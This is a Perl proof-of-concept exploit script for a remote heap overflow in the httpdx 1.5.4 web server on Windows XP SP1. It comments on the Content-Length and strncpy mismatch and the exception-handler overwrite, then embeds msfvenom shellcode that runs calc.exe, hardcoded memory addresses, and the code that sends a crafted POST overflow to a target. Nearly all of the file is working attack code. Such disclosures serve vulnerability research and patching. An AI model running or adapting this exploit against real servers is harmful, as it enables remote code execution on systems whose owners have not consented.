#!/usr/bin/perl -w
#======================================================================
# Exploit Title: httpdx <= 1.5.4 Remote Heap Overflow 
# Date: 28 July 2012
# Exploit Author: st3n [at sign] funoverip [dot] net
# Vendor Homepage: http://httpdx.sourceforge.net
# Download link: http://sourceforge.net/projects/httpdx/files/httpdx/httpdx%201.5.4/httpdx1.5.4.zip/download
# Version: 1.5.4
# Tested on: WinXP SP1
#======================================================================
# Additional notes:
# -----------------
#
# - During a POST request, httpdx allocates memory with malloc(size+1),
#   where 'size' is actually the value of "Content-Length" HTTP header..
#   All post-data will then be copied into this area using strncpy(x,y,size2),
#   where 'size2' = "request length" - "header length" (and not Content-Length)
#
# - As httpdx use it own handler function upon crash, this exploit  overwrite 
#   the first _VECTORED_EXCEPTION_NODE structure with a pointer to our shellcode.
#
# - The exploit works very often, but not always. In both case, httpdx crash 
#   after the exploit.
#
# - WinXP SP1
#   0x77ED73B4 --> UnhandledExceptionFilter()
#======================================================================
use strict;
use IO::Socket::INET;


# target
my $host = "127.0.0.1";

# The [perl|php|py|..] page to call during the POST request.
# The page must exists and the extension must be defined in the directive 
# "http.handlers = {...}" in httpdx.conf
my $page = "/test.pl";


# Windows XP - SP1 - English
# ---------------------------
# ptr to the first _VECTORED_EXCEPTION_NODE structure  = 0x77fc3210 - 4
my $veh_node_addr = 0x77fc320c ; 

# pointer to out shellcode => 0x00227664 - 8 = 0x0022765c
my $sc_ptr = 0x0022765c;


# shellcode
# (msfvenom -p windows/exec -f perl CMD=calc.exe)
my $shellcode =
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" .
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" .
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" .
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" .
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" .
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" .
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" .
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" .
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" .
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" .
"\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68" .
"\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95" .
"\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" .
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e" .
"\x65\x78\x65\x00";


# flush after every write
$| = 1;

my $sock = IO::Socket::INET->new("$host:80");

print $sock "POST $page HTTP/1.0\r\n" . 
		"Content-Length: 1023\r\n" . 
		"Content-Type: text\r\n" . 
		"Host: $host" . "\r\n" .
		"\r\n" .
		# shellcode
		$shellcode .
		# nops
		"\x90" x (1032-length($shellcode)) .
		# VEH addr
		pack('V', $veh_node_addr) .
		# ptr to shellcode
		pack('V', $sc_ptr) 
		;
# if any ...
while(<$sock>){
        print $_;
}
exit;

